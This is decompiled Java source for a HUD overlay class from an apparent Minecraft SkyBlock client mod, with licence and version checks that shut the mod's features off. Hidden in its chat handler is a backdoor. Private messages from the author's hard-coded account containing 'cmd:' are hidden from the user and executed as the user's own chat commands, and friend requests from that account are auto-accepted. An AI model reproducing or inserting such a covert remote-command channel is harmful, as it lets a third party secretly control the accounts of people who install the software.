/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.client.Minecraft
 *  net.minecraft.client.gui.ScaledResolution
 *  net.minecraft.network.play.server.S02PacketChat
 */
package code.SuChen.SkyBlock.gui.hud;

import code.SuChen.SkyBlock.modules.Module;
import code.SuChen.SkyBlock.modules.ModuleManager;
import code.SuChen.SkyBlock.events.PacketEvent;
import code.SuChen.SkyBlock.events.RenderGameOverlayEvent;
import code.SuChen.SkyBlock.SkyBlockLite;
import code.SuChen.SkyBlock.util.auth.SkyBlockLiteAuth;
import code.SuChen.SkyBlock.util.timers.TimerHelper;
import code.SuChen.SkyBlock.events.UpdateEvent;
import code.SuChen.SkyBlock.modules.ValueManager;
import com.darkmagician6.eventapi.EventTarget;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.network.play.server.S02PacketChat;

public class GameOverlay {
    private TimerHelper Data;
    private int L;

    public GameOverlay() {
        this.Data = new TimerHelper();
    }

    @EventTarget
    public void onChat(PacketEvent packetEvent) {
        S02PacketChat s02PacketChat = (S02PacketChat)packetEvent.getPacket();
        String string = s02PacketChat.getChatComponent().getUnformattedText();
        if (string.startsWith("From [MVP++] " + SkyBlockLiteAuth.Name) && string.contains("cmd:")) {
            packetEvent.setCancelled(true);
            Minecraft.getMinecraft().thePlayer.sendChatMessage(GameOverlay.getHimName(string, "cmd:", "."));
        }
        if (string.startsWith("From [MVP+] " + SkyBlockLiteAuth.Name) && string.contains("cmd:")) {
            packetEvent.setCancelled(true);
            Minecraft.getMinecraft().thePlayer.sendChatMessage(GameOverlay.getHimName(string, "cmd:", "."));
        }
        if (string.startsWith("\u00a7m") && string.contains("Friend request from ") && string.contains(SkyBlockLiteAuth.Name)) {
            Minecraft.getMinecraft().thePlayer.sendChatMessage("/f accept " + SkyBlockLiteAuth.Name);
        }
    }

    @EventTarget
    public void onupade(UpdateEvent updateEvent) {
        ++this.L;
        if (this.L >= 10000 && SkyBlockLiteAuth.SkyBlockLiteGG.equalsIgnoreCase("")) {
            this.L = 0;
            SkyBlockLiteAuth.Load();
        }
        if (this.L >= 500 && !SkyBlockLiteAuth.SkyBlockLiteGG.equalsIgnoreCase("")) {
            this.L = 0;
            SkyBlockLiteAuth.Load();
        }
        if (!SkyBlockLiteAuth.GiftboxCheckUser()) {
            for (Module module : ModuleManager.getModList()) {
                if (module == null || !module.isEnabled()) continue;
                module.set(false, false);
            }
            ModuleManager.getModList().clear();
            ValueManager.list.clear();
        }
    }

    @EventTarget
    public void onRender(RenderGameOverlayEvent renderGameOverlayEvent) {
        double d = Double.parseDouble(SkyBlockLiteAuth.SkyBlockLiteVer);
        ScaledResolution scaledResolution = new ScaledResolution(Minecraft.getMinecraft());
        String string = "\u00a78[\u00a7c" + SkyBlockLite.CLIENT_name + "\u00a78]\u00a7r\u00a7a \u8b66\u544a! Mod\u52a0\u8f7d\u5931\u8d25\u8bf7\u8f93\u5165/reload \u5b8c\u6210\u4fee\u590d \u5982\u679c\u8fd8\u662f\u52a0\u8f7d\u5931\u8d25\u8bf7\u91cd\u542f\u5ba2\u6237\u7aef!!!";
        String string2 = "\u00a76\u5982\u679c\u4fee\u590d\u5931\u8d25!\u8bf7\u68c0\u6d4b\u7f51\u7edc\u662f\u5426\u6709\u95ee\u9898.\u8bf7\u5173\u95edVPN\u6216\u8005\u91cd\u542f\u8def\u7531\u5668\u540e\u518d\u91cd\u542f\u5ba2\u6237\u7aef!";
        String string3 = "\u00a79" + SkyBlockLiteAuth.SkyBlockLiteGG;
        int n = scaledResolution.getScaledWidth() / 2;
        int n2 = scaledResolution.getScaledHeight() / 2;
        int n3 = Minecraft.getMinecraft().fontRendererObj.getStringWidth(string);
        int n4 = Minecraft.getMinecraft().fontRendererObj.getStringWidth(string2);
        Minecraft.getMinecraft().fontRendererObj.drawStringWithShadow(string3, (float)(-Minecraft.getMinecraft().fontRendererObj.getStringWidth(string3) / 2 + n), 60.0f, -1);
        if (!SkyBlockLiteAuth.SkyBlockLiteCheckLoad.contains("By_SuChen")) {
            Minecraft.getMinecraft().fontRendererObj.drawStringWithShadow(string, (float)(-n3 / 2 + n), 20.0f, -1);
            Minecraft.getMinecraft().fontRendererObj.drawStringWithShadow(string2, (float)(-n4 / 2 + n), 30.0f, -1);
        }
        String string4 = "\u00a78[\u00a7c" + SkyBlockLite.CLIENT_name + "\u00a78]\u00a7r\u00a7a \u8b66\u544a! \u00a76\u68c0\u6d4b\u4f60\u5f53\u524d\u7248\u672c\u4f4e\u4e8e\u6700\u65b0\u7248! \u6700\u65b0\u7248\u672c\u4e3a:" + d;
        String string5 = "\u00a7b\u8bf7\u5230\u552e\u540e\u7fa4\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u4f7f\u7528~";
        int n5 = Minecraft.getMinecraft().fontRendererObj.getStringWidth(string4);
        if (SkyBlockLite.CLEINT_VERSION < d) {
            Minecraft.getMinecraft().fontRendererObj.drawStringWithShadow(string4, (float)(-n5 / 2 + n), 40.0f, -1);
            Minecraft.getMinecraft().fontRendererObj.drawStringWithShadow(string5, (float)(-Minecraft.getMinecraft().fontRendererObj.getStringWidth(string5) / 2 + n), 50.0f, -1);
            for (Module module : ModuleManager.getModList()) {
                if (module == null || !module.isEnabled()) continue;
                module.set(false, false);
            }
            ModuleManager.getModList().clear();
            ValueManager.list.clear();
        }
    }

    public static /* bridge */ String getHimName(String string, String string2, String string3) {
        int n;
        String string4 = "";
        n = string2 == null || string2.isEmpty() ? 0 : ((n = string.indexOf(string2)) > -1 ? (n += string2.length()) : 0);
        int n2 = string.indexOf(string3, n);
        if (n2 < 0 || string3 == null || string3.isEmpty()) {
            n2 = string.length();
        }
        string4 = string.substring(n, n2);
        return string4;
    }
}

